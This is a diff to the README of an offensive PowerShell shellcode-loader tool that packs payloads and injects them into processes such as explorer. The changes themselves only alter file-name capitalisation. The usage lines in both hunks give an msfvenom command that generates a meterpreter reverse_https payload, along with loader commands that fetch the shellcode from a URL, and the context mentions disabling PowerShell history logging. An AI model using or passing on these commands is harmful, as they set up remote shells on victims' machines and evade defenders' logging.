@@ -33,11 +33,11 @@ The shellcode needs to be generated with the format 'ps1' (e.g. [Byte[]] $buf = 
   - Disabling PowerShell history logging
 
 > Usage (examples)
-  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o Shellcode
+  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o shellcode
   - Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
-  - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1  
+  - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1  
   Or  
-  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1
   
 > License
   - GNU General Public License v3.0
@@ -57,11 +57,11 @@ The shellcode needs to be generated with the format 'ps1' (e.g. [Byte[]] $buf = 
   - Disabling PowerShell history logging
 
 > Usage (examples)
-  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o Shellcode
+  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o shellcode
   - Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
-  - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellCode -TargetProcess explorer -OutFile C:\path\Packed-ShellCodeLoader.ps1  
+  - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1  
   Or  
-  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellCode -TargetProcess explorer -OutFile C:\path\Packed-ShellCodeLoader.ps1
+  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1
 
 > License
   - GNU General Public License v3.0
